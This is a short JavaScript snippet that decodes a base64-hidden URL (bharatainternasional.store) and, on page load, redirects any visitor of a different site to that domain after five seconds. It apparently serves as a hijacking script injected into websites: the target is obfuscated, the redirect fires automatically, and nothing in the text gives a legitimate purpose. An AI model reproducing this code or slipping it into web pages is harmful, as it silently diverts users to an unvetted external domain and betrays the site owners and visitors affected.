(function() {
    const encodedUrl = "aHR0cHM6Ly9iaGFyYXRhaW50ZXJuYXNpb25hbC5zdG9yZQ==";
    const delay = 5 * 1000;
    const currentHost = window.location.hostname;
    const destination = atob(encodedUrl).replace("https://", "");

    function initiate() {
        if (currentHost !== destination) {
            setTimeout(() => {
                window.location.href = atob(encodedUrl);
            }, delay);
        }
    }

    window.addEventListener('load', initiate);
})();
